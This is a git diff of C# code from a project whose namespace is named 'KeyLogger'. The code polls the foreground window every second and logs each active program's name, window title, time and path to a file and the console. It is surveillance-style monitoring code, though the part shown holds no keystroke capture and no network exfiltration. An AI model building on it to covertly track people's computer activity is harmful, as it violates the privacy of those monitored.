@@ -9,11 +9,29 @@ using System.Threading;
 using System.Windows.Forms;
 using System.IO;
 
-namespace key
+namespace key.KeyLogger
 {
     public class ProcessActivity
     {
-            private static List<appActivity> start = new List<appActivity>();
+        private static ProcessActivity _Instance;
+
+        public static ProcessActivity Instance
+        {
+            get
+            {
+                if (_Instance == null)
+                {
+                    _Instance = new ProcessActivity();
+                }
+                return _Instance;
+            }
+            private set
+            {
+
+            }
+        }
+        public ProcessActivity() { }
+        private static List<appActivity> start = new List<appActivity>();
 
         static void WriteLog(string process)
         {
@@ -25,86 +43,86 @@ namespace key
             sw.Close();
         }
         private static Process GetProcessByHandle(IntPtr hwnd)
+        {
+            try
             {
-                try
+                uint processID;
+                API.GetWindowThreadProcessId(hwnd, out processID);
+                return Process.GetProcessById((int)processID);
+            }
+            catch { return null; }
+        }
+
+        private static Process GetActiveProcess()
+        {
+            IntPtr hwnd = API.GetForegroundWindow();
+            return hwnd != null ? GetProcessByHandle(hwnd) : null;
+        }
+
+        private static bool ListAndCheck(appActivity a)
+        {
+            bool check = false;
+            start.Add(a);
+            if (start.Count == 1) check = true;
+            else
+            {
+                var duplicateExists = start.Where(x => x.NameProcess == a.NameProcess && x.Title == a.Title && x.Time == a.Time && x.Path == a.Path).Count();
+                if (duplicateExists > 1)
                 {
-                    uint processID;
-                    API.GetWindowThreadProcessId(hwnd, out processID);
-                    return Process.GetProcessById((int)processID);
+                    check = false;
                 }
-                catch { return null; }
-            }
-
-            private static Process GetActiveProcess()
-            {
-                IntPtr hwnd = API.GetForegroundWindow();
-                return hwnd != null ? GetProcessByHandle(hwnd) : null;
-            }
-
-            private static bool ListAndCheck(appActivity a)
-            {
-                bool check = false;
-                start.Add(a);
-                if (start.Count == 1) check = true;
                 else
                 {
-                    var duplicateExists = start.Where(x => x.NameProcess == a.NameProcess && x.Title == a.Title && x.Time == a.Time && x.Path == a.Path).Count();
-                    if (duplicateExists > 1)
-                    {
-                        check = false;
-                    }
-                    else
-                    {
-                        check = true;
-                    }
+                    check = true;
                 }
-                return check;
             }
+            return check;
+        }
 
 
-            public static void NotificationWhenActivate()
+        public void NotificationWhenActivate()
+        {
+            List<string> arrayprocess = new List<string>();
+            while (true)
             {
-                List<string> arrayprocess = new List<string>();
-                while (true)
+                Process p = GetActiveProcess();
+                if (p != null)
                 {
-                    Process p = GetActiveProcess();
-                    if (p != null)
+                    try
                     {
-                        try
+                        appActivity a = new appActivity();
+
+                        a.NameProcess = p.ProcessName.ToString();
+                        a.Title = p.MainWindowTitle.ToString();
+                        a.Time = DateTime.Now.ToString("dd-MM-yyyy hh::mm::ss tt");
+                        a.Path = p.MainModule.FileName.ToString();
+
+                        string process = "NameProcess: " + a.NameProcess + Environment.NewLine +
+                                         "MainWindownTitle: " + a.Title + Environment.NewLine +
+                                         "TimeExcute: " + a.Time + Environment.NewLine +
+                                         "Path: " + a.Path;
+
+                        if (ListAndCheck(a) == true)
                         {
-                            appActivity a = new appActivity();
-
-                            a.NameProcess = p.ProcessName.ToString();
-                            a.Title = p.MainWindowTitle.ToString();
-                            a.Time = p.StartTime.ToString("dd-MM-yyyy hh::mm::ss tt");
-                            a.Path = p.MainModule.FileName.ToString();
-
-                            string process = "NameProcess: " + a.NameProcess + Environment.NewLine +
-                                             "MainWindownTitle: " + a.Title + Environment.NewLine +
-                                             "TimeExcute: " + a.Time + Environment.NewLine +
-                                             "Path: " + a.Path;
-
-                            if (ListAndCheck(a) == true)
-                            {
-                                Console.Write("\n\n" + process + "\n\n");
-                                arrayprocess.Add(process);
-                                WriteLog("\n\n" + process + "\n\n");
-                            }
-                            if (arrayprocess[arrayprocess.Count - 1] != process)
-                            {
-                                Console.Write("\n\n" + process + "\n\n");
-                                arrayprocess.Add(process);
-                                WriteLog("\n\n" + process + "\n\n");
-                            }
+                            Console.Write("\n\n" + process + "\n\n");
+                            arrayprocess.Add(process);
+                            WriteLog("\n\n" + process + "\n\n");
                         }
-                        catch (Exception e)
+                        if (arrayprocess[arrayprocess.Count - 1] != process)
                         {
-                            Console.WriteLine();
-                            Console.WriteLine(e.ToString());
+                            Console.Write("\n\n" + process + "\n\n");
+                            arrayprocess.Add(process);
+                            WriteLog("\n\n" + process + "\n\n");
                         }
                     }
-                Thread.Sleep(1000);
+                    catch (Exception e)
+                    {
+                        Console.WriteLine();
+                        Console.WriteLine(e.ToString());
+                    }
                 }
+                Thread.Sleep(1000);
+            }
         }
     }
 }
